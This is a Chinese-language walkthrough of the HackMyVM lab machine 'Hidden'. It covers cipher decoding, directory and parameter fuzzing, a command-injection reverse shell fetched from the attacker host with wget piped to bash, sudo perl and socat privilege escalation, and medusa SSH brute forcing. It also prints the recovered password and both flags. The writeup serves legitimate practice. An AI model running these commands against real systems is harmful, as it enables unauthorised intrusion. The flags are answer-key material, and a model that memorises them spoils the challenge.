# Hidden

2024-11-14 https://hackmyvm.eu/machines/machine.php?vm=Hidden

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 80 web 服务，首页有一张图片，html 源码中注释： format xxx.xxxxxx.xxx 像是图片中代表了某种信息，图形中有 12 个方块，前面提示中有 12 个 x，经过搜索发现是 Rosicrucian Cipher 编码，
在此网站中按照图片中的顺序选择，最后得到： SYSHIDDENHMV 根据上面的 format 应该是 sys.hidden.hmv 像是一个域名，将其添加到 /etc/hosts 文件中。

访问 http://sys.hidden.hmv/ 出现了 level 2，经过查看 mapascii 中没有隐写信息，使用 feroxbuster 进行目录递归扫描，发现了 4 个隐藏目录：

```
http://sys.hidden.hmv/users
http://sys.hidden.hmv/members
http://sys.hidden.hmv/weapon
http://sys.hidden.hmv/weapon/loot.php
```

其中前 3 个没有什么内容，loot.php 这个 php 文件访问后没有反应，ffuf 看看有没有隐藏参数,尝试 RCE 或者 LFI 探测：

```
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://sys.hidden.hmv/weapon/loot.php?FUZZ=ls -fs 0
```

发现隐藏参数 hack 能够执行系统命令 http://sys.hidden.hmv/weapon/loot.php?hack=ls

所以直接进行反弹 shell：

```
nc -lvnp 8888

curl -G --data-urlencode 'hack=wget -q -O - http://192.168.5.3/5-3/8888.sh|bash' http://sys.hidden.hmv/weapon/loot.php
```

获得 shell 后，sudo -l 发现：

```
(toreto) NOPASSWD: /usr/bin/perl
```

先升级到 toreto：

```
sudo -u toreto perl -e 'exec "/bin/bash";'
```

在 /home/atenea/.hidden 目录中发现 atenea.txt 文件，其中的内容像是密码字典，将其下载到 kali 使用 medusa 爆破 ssh(速度很慢，560 个字典跑了一会):

```
medusa -u atenea -P pass -M ssh  -h 192.168.5.40 -v 4
```

最终找到密码: sys8423hmv 使用 ssh 登陆用户 atenea，先获得了 user flag：

```
atenea@hidden:~$ cat user.txt
--------------------
hmv{c4HqWSzRVKNDpTL}
```

sudo -l 发现直接可以提权：

```
(root) NOPASSWD: /usr/bin/socat
```

```
atenea@hidden:~$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
--------------------
hmv{2Mxtnwrht0ogHB6}
--------------------
```
